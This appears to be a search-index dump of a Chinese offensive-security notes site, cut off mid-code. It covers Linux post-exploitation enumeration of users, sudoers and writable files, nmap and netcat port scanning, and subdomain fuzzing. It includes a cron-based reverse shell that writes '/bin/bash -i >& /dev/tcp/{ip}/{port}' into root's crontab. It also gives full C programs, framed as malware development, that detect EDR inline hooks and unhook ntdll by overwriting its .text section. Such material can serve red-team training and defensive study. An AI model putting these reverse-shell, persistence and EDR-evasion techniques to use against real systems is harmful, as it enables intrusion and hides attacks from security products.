[{"id":0,"href":"/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/amass/","title":"Amass","section":"Docs","content":" Amass # https://github.com/owasp-amass/amass\n"},{"id":1,"href":"/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/linux%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"Linux内部信息收集","section":"Docs","content":" Linux内部信息收集 # 查看系统版本 # cat /etc/issue cat /etc/*-release cat /etc/lsb-release cat /etc/redhat-release cat /proc/version uname -a 查看内核版本 # (cat /proc/version || uname -a ) 2\u0026gt;/dev/null lsb_release -a 2\u0026gt;/dev/null old, not by default on many systems cat /etc/os-release 2\u0026gt;/dev/null universal on modern systems proc 文件系统 # https://blog.csdn.net/cjdgg/article/details/119860355\n查看环境变量 # (env || set) 2\u0026gt;/dev/null 如果你对位于 PATH 变量中任何文件夹的写入权限，你就有可能劫持某些库或二进制文件\n查看用户信息 # id // 查看当前用户信息 who // 查看当前登录用户 w // 查看当前登录用户 last // 查看登录历史 cat /etc/passwd | cut -d: -f1// 查看所有用户 grep -v -E \u0026quot;^#\u0026quot; /etc/passwd | awk -F: '$3 == 0 { print $1}'// 查看所有 root 用户 awk -F: '($3 == \u0026quot;0\u0026quot;) {print}' /etc/passwd // 0 为 root 用户 cat /etc/sudoers // 查看 sudo 权限 查看网络信息 # ifconfig -a ip a cat /etc/network/interfaces cat /etc/sysconfig/network cat /etc/resolv.conf 查看有写权限的文件 # find / -writable -type -f 2\u0026gt;/dev/null find / -writable -type -f -not -path \u0026quot;/proc/*\u0026quot; -not -path \u0026quot;/sys/*\u0026quot; 2\u0026gt;/dev/null 查看 sudo 权限 # sudo -l 查看进程信息 # ps -ef ps aux top cat /etc/services 查看计划任务 # cat /etc/crontab 查看网络链接 # netstat -antup netstat -antpx ss -antup 查看防火墙 # iptables -L ufw status firewall-cmd --state cat /etc/sysconfig/iptables cat /etc/iptables.conf cat /etc/ufw/ufw.conf 查看系统服务 # systemctl list-units --type service --all systemctl list-unit-files systemctl list-units --type target 查看某一用户组中的用户 # getent group \u0026lt;groupname\u0026gt; getent group \u0026lt;gid\u0026gt; 查看某一用户的组 # groups \u0026lt;username\u0026gt; 查看邮件信息 # cat /var/mail/\u0026lt;username\u0026gt; 数据库信息 # mysql -u root -p\npsql -U postgres\nsqlite3 /path/to/db\n"},{"id":2,"href":"/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F/","title":"主机扫描","section":"Docs","content":" nmap 扫描 # 命令 # 一（两）句话扫描 # ports=$(nmap -Pn -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) nmap -p$ports -Pn -sC -sV $IP 扫描网段 # sudo nmap -sn 172.16.200.0/24\n扫描操作系统 # sudo nmap -O ...\n扫描端口 # sudo nmap --min-rate 10000 -p- 172.16.200.131 -oA ports\n最低速率10000是权衡的结果，过快扫不准，过慢时间长，10000 是一般情况下适合的值 10000 是指每秒钟发送 10000 个数据包，即每秒钟扫描 10000 个端口 -p-表示 1-65535 端口 扫描 UDP 端口 # sudo nmap -sU --min-rate 10000 -p- 172.16.200.131 -oA UDPports\n-sU 使用 UDP 格式化端口信息 # grep open ports.nmap | awk -F'/' '{print $1}' | tr '\\n' ','\n扫描服务 # sudo nmap -sT -sV -sC -O -pxx,xx,xx 172.16.200.131\n-sT 使用 TCP -sV 扫描服务版本 -sC 使用默认脚本 -O 扫描操作系统信息 xx 表示扫描出来的端口 扫描漏洞 # sudo nmap --script=vuln -pxx,xx,xx 172.16.200.131\nLinux Shell 脚本 ping 扫描 # for i in {1..254};do ping -c 1 -W 1 172.16.200.$i | grep from;done ping 成功后会显示 from，所以使用 grep from；-c：发包数量；-W：超时时间\nLinux 伪设备扫描端口 # for i in {1..65535};do (echo \u0026lt; /dev/tcp/172.16.200.131/$i) \u0026amp;\u0026gt;/dev/null \u0026amp;\u0026amp; printf \u0026quot;[+] The Open Port is: %d\\n\u0026quot; \u0026quot;$i\u0026quot;;done\n\u0026amp;\u0026gt;/dev/null 把标准输出和标准错误输出都重定向到/dev/null，即不显示任何信息 \u0026amp;\u0026amp; 表示前面的命令执行成功后才执行后面的命令，即端口连接成功时才显示端口号 netcat 实现端口扫描 # 新版 kali 中装的是新版的 nc，要实现端口扫描，需要使用旧版 nc，命令为 nc.traditional nc.traditional -vv -z 172.16.200.131 1-65535 2\u0026gt;\u0026amp;1 | grep -v refused\n-vv 选项表示 \u0026ldquo;very verbose\u0026rdquo;，即非常详细的输出模式。使用该选项会生成更详细的连接信息，包括连接的建立和关闭过程中的各种状态。 -z 选项用于进行端口扫描而不建立实际的连接。它会尝试连接指定的 IP 地址和端口，但不会发送实际的数据。 2\u0026gt;\u0026amp;1 是一种重定向语法，用于将标准错误输出（stderr）重定向到标准输出（stdout）； grep 的-v表示反向 Windows 批处理脚本扫描主机 # for /l %i in (1,1,254) do ping -n 1 -w 1 172.16.200.%i | find \u0026quot;TTL=\u0026quot;\n扫描某台主机的 IPv6 地址/其他地址 # IOXIDResolver sudo python3 ./IOXIDResolver.py -t xxx.xxx.xxx.xxx namp 扫描 IPv6 地址：-6\nsnmpwalk 扫描 # snmp 是一种网络管理协议，可以通过 snmpwalk 扫描主机信息 sudo snmpwalk -c public -v2c\n-c 指定 community -v2c 指定版本，有 v1、v2c、v3 "},{"id":3,"href":"/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F/","title":"子域名扫描","section":"Docs","content":" 子域名扫描 # amass # amass enum -d example.com 通过虚构Host头扫描反代配置的其他域名 # wfuzz -c -u \u0026#34;http://example.com\u0026#34; -H \u0026#34;Host: FUZZ.example.com\u0026#34; -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt "},{"id":4,"href":"/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/","title":"定时任务","section":"Docs","content":" 定时任务反弹shell # crontab -l ls -al /etc/cron* /etc/at* cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2\u0026gt;/dev/null | grep -v \u0026#34;^#\u0026#34; 各系统定时任务文件位置 # CentOS/RedHat：/var/spool/cron/ Ubuntu/Debian：/var/spool/cron/crontabs/ FreeBSD：/var/cron/tabs/ MacOS：/usr/lib/cron/tabs/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名\n反弹shell # echo \u0026#39;* * * * * /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/{ip}/{port} 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt; /var/spool/cron/crontabs/root 解决ubuntu-crontab反弹shell失败的问题 # echo \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/{ip}/{port} 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt; /tmp/shell.sh chmod +x /tmp/shell.sh echo \u0026#39;* * * * * /tmp/shell.sh\u0026#39; \u0026gt; /var/spool/cron/crontabs/root "},{"id":5,"href":"/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/","title":"目录扫描","section":"Docs","content":" web 扫描 # feroxbuster # https://github.com/epi052/feroxbuster\n目录扫描器，支持递归，但线程太多，可能需要手动调整\ngobuster # https://github.com/OJ/gobuster\n目录扫描器\nV3n0M-Scanner # https://github.com/v3n0m-Scanner/V3n0M-Scanner\n针对 SQLi/XSS/LFI/RFI 和其他漏洞的流行测试扫描器 Python 3.6\nXSpear # https://github.com/hahwul/XSpear\nXSS 扫描\nPacker Fuzzer # https://github.com/rtcatc/Packer-Fuzzer\n一款针对 Webpack 等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具\n"},{"id":6,"href":"/docs/%E5%85%B6%E4%BB%96/hooking/1.%E7%94%A8%E6%88%B7%E6%80%81hooking%E4%BB%8B%E7%BB%8D/","title":"1.用户态 Hooking介绍","section":"Docs","content":" 1. 用户态Hooking介绍 # Hook，即钩子，在网络安全用语中，指的是拦截并且修改特定的 API 执行流程，通常用于 Debugging，逆向工程，游戏作弊，检测恶意软件行为。API Hook 将原有的 API 替换为自定义的以进行额外的检视，如果非恶意，则继而调用原有的 API，否则会被拦截。\n安全产品，例如 EDR，可能会实施 SSDT Hooking，IAT Hooking，内联 Hooking。不过对于 SSDT Hooking，因为是内核层的，虽然安全产品可以实施 SSDT Hooking 从而实现更彻底的检视，但也会被恶意软件用来实现文件、网络连接、注册表键等的隐藏。基于内核层的更改，无论目的是好是坏，都可能影响系统安全性、完整性、以及稳定性，因此微软后来引入了 PatchGuard 来阻止对内核的补丁。作为\u0026quot;补偿\u0026quot;，微软引入了我们之前简述过的内核回调，供安全产品进行内核层面的检视。\nIAT Hooking # 我们在 PE 小节介绍过 IAT 表了，IAT 表记录了映像文件所引用的模块以及其中的导出函数。我们在编写恶意软件时，调用 Win32 API 或者 NTAPI 的话，则会使 IAT 表中增加该 API 以及其所在的模块。\n以 calc 为例，我们使用 PE Bear 可以查看其在磁盘时候的 IAT 表，这时候 IAT 与 INT 是一致的，没有函数地址。但当 calc 被载入到内存中时，IAT 中会更新函数的地址。例如，我们在下图可以看到 KERNEL32 模块中第一个导入函数是 GetCurrentThreadId，当前 IAT 条目中的值是 HintName 表的 RVA。\n在 WinDBG 中，我们印证了，并且该条目的值被更新成了函数的地址。\n但如果，IAT 条目中的值被修改成安全产品模块的导出函数，那么是不是就意味着调用该函数的时候，安全产品都在检视了？IAT Hooking，就是这么一个原理。不过，如今安全产品，尤其是 EDR，主要使用下面要讲的内联 Hooking 进行函数调用检视。\n内联 Hooking # 内联 Hooking 是如今更主流的 Hooking 方案，EDR 通常会给 NTAPI 设置内联 Hook，因为 NTAPI 作为用户态与内核态的桥梁。内联 Hook 的特征为在 NTAPI 代码的 syscall 指令前，加入无条件的跳转，即 jmp 命令。\n下图是常被恶意软件所利用的 NtWriteVirtualMemory，其 Win32 API 是 WriteProcessMemory。我们可以看到，第 2 条指令跳转到了别处，这是被 hook 的特征。当然了，不同的 EDR hook 的函数可能所有不同(但肯定有一些 NTAPI 是都被 Hook 的)，hook 的指令位置也可能有所不同，例如有的 EDR 会覆盖 mov r10, rcx 这条指令。但是，跳转一定是发生在 syscall 指令之前，因为 syscall 指令的执行即意味着向内核态的过渡。\n而对于不怎么在恶意软件中被利用的良性 NTAPI，则没有被 hook 的迹象。\n实际上，对于大多数 NTAPI，代码都形如下图，这是 syscall 的格式。至于和上图相差的几条指令，至少在 x64 中，并非必须的，也就是有着下述这几条指令，就可以完成 syscall。\nmov r10, rcx mov rax, [SSN] syscall ret 在稍后的章节，我们会讲解如何绕过内联 Hook。\n"},{"id":7,"href":"/docs/%E5%85%B6%E4%BB%96/hooking/2.%E7%BB%95%E8%BF%87%E7%94%A8%E6%88%B7%E6%80%81hooking/","title":"2.绕过用户态 Hooking","section":"Docs","content":" 2. 绕过用户态Hooking # 在上个小节，我们讨论了 EDR 在用户态设置 Hook 的原理，那么相应地，我们可以根据这原理寻找间隙，实现对用户态 Hook 的绕过。截至目前，已经有多种方法绕过 Hook。不过，Hook 并非 EDR 的全部检测能力的来源，因此绕过 Hook 的这个过程本身可能就会被检测为恶意。不过无论如何，在这个小节，我们会过一下常见的一些用于绕过 Hook 的方法，以及它们的 IOC。在下个小节，我们会继续探讨绕过用户态 Hook 的方法，虽然会更加复杂一些。\n检测内联 Hook # 内联 Hook 的实施是在要 Hook 的 NTAPI 的 syscall stub 中的 syscall 指令之前用无条件跳转指令覆盖原有指令。不同的 EDR 可能会覆盖不同的指令，例如 CrowdStrike 覆盖的是 mov eax, SSN 这条指令，有的 EDR 覆盖的是 mov r10, rcx 这条指令。\n因此，代码的逻辑便很直接，逐一检查 syscall stub 的前 4 个字节。在代码里，我们通过 PEB Walking 的方法在不调用 LoadLibray，GetModuleHandle，GetProcAddress 函数的情况下可以获得 ntdll 模块的地址、给定函数的地址。这么做可以避免 LoadLibray，GetModuleHandle，GetProcAddress 这些函数在 IAT 中的显示。\n因为涉及对模块的解析，因此我们也会频繁用到 PE 文件相关的结构体。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; //Get module handle for ntdll and kernel32 at the same time void GetModule(HMODULE* ntdll, HMODULE* kernel32) { PPEB peb = (PPEB)(__readgsqword(0x60)); PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((PBYTE)peb + 0x18); //PPEB_LDR_DATA pLdr = pPeb-\u0026gt;Ldr; PLIST_ENTRY ntdlllistentry = *(PLIST_ENTRY*)((PBYTE)ldr + 0x30); *ntdll = *(HMODULE*)((PBYTE)ntdlllistentry + 0x10); PLIST_ENTRY kernelbaselistentry = *(PLIST_ENTRY*)((PBYTE)ntdlllistentry); PLIST_ENTRY kernel32listentry = *(PLIST_ENTRY*)((PBYTE)kernelbaselistentry); *kernel32 = *(HMODULE*)((PBYTE)kernel32listentry + 0x10); } BOOL CheckFuncByName(IN HMODULE hModule, const CHAR * funcName) { PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return false; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return false; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PBYTE pFunctionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); if (_stricmp(funcName,pFunctionName)==0) { // Check if the first 4 bytes match 0x4C, 0x8B, 0xD1, and 0xB8 if (pFunctionAddress[0] == 0x4C \u0026amp;\u0026amp; pFunctionAddress[1] == 0x8B \u0026amp;\u0026amp; pFunctionAddress[2] == 0xD1 \u0026amp;\u0026amp; pFunctionAddress[3] == 0xB8) { printf(\u0026#34;NTAPI %s may not be hooked\\n\u0026#34;, funcName); } else { printf(\u0026#34;NTAPI %s is hooked\\n\u0026#34;, funcName); return true; } return false; } } return false; } int main() { HMODULE ntdll; HMODULE kernel32; GetModule(\u0026amp;ntdll, \u0026amp;kernel32); printf(\u0026#34;ntdll base address: %p\\n\u0026#34;, ntdll); printf(\u0026#34;kernel32 base address: %p\\n\u0026#34;, kernel32); CheckFuncByName(ntdll,\u0026#34;NtAllocateVirtualMemory\u0026#34;); CheckFuncByName(ntdll, \u0026#34;NtOpenProcess\u0026#34;); CheckFuncByName(ntdll, \u0026#34;NtReadVirtualMemory\u0026#34;); CheckFuncByName(ntdll, \u0026#34;NtWriteVirtualMemory\u0026#34;); return 0; } 编译后，使用 WinDBG 来调试该程序，通过手动修改 NtOpenProcess 的第一条指令来模拟 hook。程序也成功地检测出 NtOpenProcess API 的指令被纂改。\n替换 .text 节 # 我们知道 PE 文件的 .text 节是可执行代码的区域，权限是 RX。既然特定 NTAPI 被 hook 了，只要用干净的 ntdll 的 .text 节来覆盖，那么我们就会得到干净的代码，自然可以实现 unhook。\n因此，我们首先要获得载入的 ntdll 模块的地址，这个我们已经用代码实现了。然后我们从磁盘读取 ntdll 文件，并存储在缓冲区中。需要注意的是，存储在缓冲区中的 ntdll 的内容是基于磁盘中的形式，即尚未映射到内存中。这样，我们有了 2 份不同的 ntdll 的地址，一份是被 hook 的，一份是干净的；一份是映射在内存中的，一份是基于磁盘形式的。因此，在将干净 ntdll 文件中的 .text 节覆盖被 hook 的 ntdll 的 .text 节时，我们需要稍加注意 PointerOfRawData 与 VirtualAddress，SizeOfRawData 与 VirtualSize。\ntypedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 以下面截图中的 ntdll 为例，在本地磁盘时，文件偏移为 0x400，尺寸为 0x11920。当被载入至内存时，RVA 是 0x1000，尺寸为 0x1190ce。我们需要注意到这差异。\n因为两者 .text 节的尺寸有轻微不同，为了保险起见，我们适用尺寸更大的 .text 节来覆盖。之所以考虑这点，我是担心如果干净的 .text 节尺寸更小，那么没有完全覆盖，载入的 ntdll 的代码区还会有少量代码残留，可能在特定情况下导致意想不到的结果。尽管在本案例中干净的代码区尺寸更大，但在其他的操作系统版本可能是相反的情况，所以我们依旧需要考虑到。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;string.h\u0026gt; void GetModule(HMODULE* ntdll, HMODULE* kernel32) { PPEB peb = (PPEB)(__readgsqword(0x60)); PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((PBYTE)peb + 0x18); //PPEB_LDR_DATA pLdr = pPeb-\u0026gt;Ldr; PLIST_ENTRY ntdlllistentry = *(PLIST_ENTRY*)((PBYTE)ldr + 0x30); *ntdll = *(HMODULE*)((PBYTE)ntdlllistentry + 0x10); PLIST_ENTRY kernelbaselistentry = *(PLIST_ENTRY*)((PBYTE)ntdlllistentry); PLIST_ENTRY kernel32listentry = *(PLIST_ENTRY*)((PBYTE)kernelbaselistentry); *kernel32 = *(HMODULE*)((PBYTE)kernel32listentry + 0x10); } BOOL CheckFuncByName(IN HMODULE hModule, const CHAR* funcName) { PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return false; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return false; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PBYTE pFunctionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); if (_stricmp(funcName, pFunctionName) == 0) { // Check if the first 4 bytes match 0x4C, 0x8B, 0xD1, and 0xB8 if (pFunctionAddress[0] == 0x4C \u0026amp;\u0026amp; pFunctionAddress[1] == 0x8B \u0026amp;\u0026amp; pFunctionAddress[2] == 0xD1 \u0026amp;\u0026amp; pFunctionAddress[3] == 0xB8) { printf(\u0026#34;NTAPI %s may not be hooked\\n\u0026#34;, funcName); } else { printf(\u0026#34;NTAPI %s is hooked\\n\u0026#34;, funcName); return true; } return false; } } return false; } int main() { HMODULE ntdll; HMODULE kernel32; GetModule(\u0026amp;ntdll, \u0026amp;kernel32); printf(\u0026#34;ntdll base address: %p\\n\u0026#34;, ntdll); printf(\u0026#34;kernel32 base address: %p\\n\u0026#34;, kernel32); CheckFuncByName(ntdll, \u0026#34;NtOpenProcess\u0026#34;); HANDLE hFile = CreateFileA(\u0026#34;C:\\\\Windows\\\\System32\\\\ntdll.dll\u0026#34;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { printf(\u0026#34;[!] CreateFileA Failed With Error : %d \\n\\n\u0026#34;, GetLastError()); return -1; } DWORD dwFileLen = GetFileSize(hFile, NULL); DWORD dwNumberOfBytesRead; PVOID pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileLen); if (!ReadFile(hFile, pNtdllBuffer, dwFileLen, \u0026amp;dwNumberOfBytesRead, NULL) || dwFileLen != dwNumberOfBytesRead) { printf(\u0026#34;[!] ReadFile Failed With Error : %d \\n\\n\u0026#34;, GetLastError()); return -1; } if (hFile) { CloseHandle(hFile); } PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdll; PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdll + hookedDosHeader-\u0026gt;e_lfanew); PIMAGE_DOS_HEADER CleanDosHeader = (PIMAGE_DOS_HEADER)pNtdllBuffer; PIMAGE_NT_HEADERS CleanNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pNtdllBuffer + CleanDosHeader-\u0026gt;e_lfanew); for (WORD i = 0; i \u0026lt; hookedNtHeader-\u0026gt;FileHeader.NumberOfSections; i++) { PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i)); PIMAGE_SECTION_HEADER CleanSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(CleanNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i)); if (!strcmp((char*)hookedSectionHeader-\u0026gt;Name, (char*)\u0026#34;.text\u0026#34;)) { LPVOID hookedTextSection = (LPVOID)((DWORD_PTR)ntdll + (DWORD_PTR)hookedSectionHeader-\u0026gt;VirtualAddress); LPVOID CleanTextSection = (LPVOID)((DWORD_PTR)pNtdllBuffer + (DWORD_PTR)CleanSectionHeader-\u0026gt;PointerToRawData); size_t size_TextSection = (hookedSectionHeader-\u0026gt;Misc.VirtualSize \u0026gt; CleanSectionHeader-\u0026gt;SizeOfRawData) ? hookedSectionHeader-\u0026gt;Misc.VirtualSize : CleanSectionHeader-\u0026gt;SizeOfRawData; DWORD oldProtection = 0; bool isProtected = VirtualProtect(hookedTextSection, size_TextSection, PAGE_EXECUTE_READWRITE, \u0026amp;oldProtection); memcpy(hookedTextSection, CleanTextSection, size_TextSection); isProtected = VirtualProtect(hookedTextSection, size_TextSection, oldProtection, \u0026amp;oldProtection); } } CheckFuncByName(ntdll, \u0026#34;NtOpenProcess\u0026#34;); return 0; } 编译后，我们使用 WinDBG 来调试该程序，为了模拟 hook，我们手动修改 NtOpenProcess API 的第一条指令，并且确认了该修改是成功的。在程序运行结束后，查看该 API，发现代码被恢复成原有的了。因此，通过替换 .text 节，我们可以实现对用户态 Hook 的绕过。\n值得一提的是，我发现其他利用此方法的代码里，作者们用了 CreateFileMapping 与 MapViewOfFile 来将干净的 ntdll 载入至内存中。\nHANDLE CreateFileMappingA( [in] HANDLE hFile, [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes, [in] DWORD flProtect, [in] DWORD dwMaximumSizeHigh, [in] DWORD dwMaximumSizeLow, [in, optional] LPCSTR lpName ); LPVOID MapViewOfFile( [in] HANDLE hFileMappingObject, [in] DWORD dwDesiredAccess, [in] DWORD dwFileOffsetHigh, [in] DWORD dwFileOffsetLow, [in] SIZE_T dwNumberOfBytesToMap ); 使用这些 WinAPI 时，因为映像被映射到内存中，因此 Windows 加载器会适用变更的对齐系数，导致 .text 的偏移也不同。如果 CreateFileMappingA 的 flProtext 参数没有包含 SEC_IMAGE 或 SEC_IMAGE_NO_EXECUTE 标志，则不会适用新的对齐。但SEC_IMAGE_NO_EXECUTE 标志还是会更好一些，因为它不会触发 PsSetLoadImageNotifyRoutine 回调。这意味着当 ntdll.dll 被映射到内存时，使用此标志不会提醒接收映像载入通知例程的安全产品。\nhSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL); if (hSection == NULL) { printf(\u0026#34;[!] CreateFileMappingA Failed With Error : %d \\n\u0026#34;, GetLastError()); return -1; } // mapping the view of file of ntdll.dll pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL); if (pNtdllBuffer == NULL) { printf(\u0026#34;[!] MapViewOfFile Failed With Error : %d \\n\u0026#34;, GetLastError()); return -1; } 好，我们来讨论一下该方法存在的 IOC：\n从磁盘中读取 ntdll.dll 对于良性程序来说比较可疑 在 unhook 之前，我们需要用到一些敏感的函数，例如 VirtualProtect，WriteProcessMemory(可用于代替 VirtualProtect 和 memcpy 组合) 等 EDR 可以验证载入的 ntdll 的完整性以判断是否遭到了纂改 拓展\n我们是从磁盘中读取 ntdll，其实我们还可以从 KnownDlls 目录、远程 web 服务器上读取。请查询资料以及所需的 API 的用法，进行实现作为练习。\n补丁 NTAPI # 相比替换整个 ntdll 模块的 .text 节，我们可以选择只补丁我们所需的且被 hook 的函数，这样，补丁的动作会相对小一些。相比之前的代码，我们可以硬编码或者动态地获得目标 NTAPI 的 syscall stub 指令字节，其实区别只在于 SSN。至于如何动态地获取 SSN，我们会在下一小节进行讲解，因此这里我们就硬编码 NtOpenProcess 的 syscall stub 好了。\n需要略加注意的是，对于给定的函数，其地址很大概率不是与内存页对齐的，幸运的是，像 VirtualAlloc、VirtualProtect 这类函数会自动帮我们适用向下最近的页的地址。\n对于代码，我们只需要增加硬编码的 NTAPI 的 syscall stub，以及对 CheckFuncByName 稍加修改。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;string.h\u0026gt; void GetModule(HMODULE* ntdll, HMODULE* kernel32) { PPEB peb = (PPEB)(__readgsqword(0x60)); PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((PBYTE)peb + 0x18); //PPEB_LDR_DATA pLdr = pPeb-\u0026gt;Ldr; PLIST_ENTRY ntdlllistentry = *(PLIST_ENTRY*)((PBYTE)ldr + 0x30); *ntdll = *(HMODULE*)((PBYTE)ntdlllistentry + 0x10); PLIST_ENTRY kernelbaselistentry = *(PLIST_ENTRY*)((PBYTE)ntdlllistentry); PLIST_ENTRY kernel32listentry = *(PLIST_ENTRY*)((PBYTE)kernelbaselistentry); *kernel32 = *(HMODULE*)((PBYTE)kernel32listentry + 0x10); } BOOL CheckFuncByName(IN HMODULE hModule, const CHAR* funcName, unsigned char* cleanNTAPI) { PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return false; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return false; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PBYTE pFunctionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); if (_stricmp(funcName, pFunctionName) == 0) { // Check if the first 4 bytes match 0x4C, 0x8B, 0xD1, and 0xB8 if (pFunctionAddress[0] == 0x4C \u0026amp;\u0026amp; pFunctionAddress[1] == 0x8B \u0026amp;\u0026amp; pFunctionAddress[2] == 0xD1 \u0026amp;\u0026amp; pFunctionAddress[3] == 0xB8) { printf(\u0026#34;NTAPI %s may not be hooked\\n\u0026#34;, funcName); } else { 